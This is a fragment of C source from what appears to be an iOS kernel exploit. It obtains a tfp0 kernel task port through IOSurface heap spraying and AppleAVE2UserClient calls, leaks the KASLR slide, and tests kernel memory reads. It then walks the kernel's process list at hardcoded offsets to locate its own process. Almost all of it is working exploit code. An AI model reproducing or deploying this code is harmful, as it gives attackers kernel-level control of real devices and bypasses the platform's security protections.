        int kr = vm_read_overwrite(tfp0_port, kaslr + HARDCODED_kernel_base, 0x4, (vm_address_t)&testread, &outsize);
        LOG(" Testing kernel memory reading: kr(0x%x) 0x%x\n", kr, testread);
        if(kr == KERN_SUCCESS)
            LOG("  Success!\n");
    }
#if 0
    // release spray mem, ease up kernel
    for(int i=1; i<0xC000; i++){
        if(!check_num_stringlizability_4bytes(i))
            continue;
        IOSurfaceRootUserClient_sRemoveValue(surface_ioconn, iosurface_1, i);
    }
#endif
    
    LOG("Got tfp0: 0x%x\n", tfp0_port);
    
    extern mach_port_t tfp0;
    tfp0 = tfp0_port;
    extern uint64_t kernel_base;
    kernel_base = HARDCODED_kernel_base + kaslr;
    LOG("Found kernel base: 0x%016llx\n", kernel_base);
    uint64_t our_proc = 0;
    uint64_t proc = KernelRead_8bytes(HARDCODED_allproc + kaslr);
    LOG("Found allproc: 0x%016llx\n", proc);
    while(proc != 0) {
        if(KernelRead_4bytes(proc + HARDCODED_proc_p_id) == getpid()) {
            LOG("Found our proc: 0x%016llx\n", proc);
            our_proc = proc;
            break;
        }
        proc = KernelRead_8bytes(proc);
    }
    if (our_proc == 0) {
        LOG("Failed to find our proc\n");
        return;
    }
    extern uint64_t cached_proc_struct_addr;
    cached_proc_struct_addr = our_proc;
}

void kernel_exp_start(io_connect_t profile_ioconn, io_connect_t ave_ioconn, io_connect_t surface_ioconn){
    
    Get_kaslr(profile_ioconn); LOG("kaslr: 0x%llx\n", kaslr);
    
    AppleAVE2UserClient_sPrepareToEncodeFrame(ave_ioconn, surface_ioconn);
}
#endif
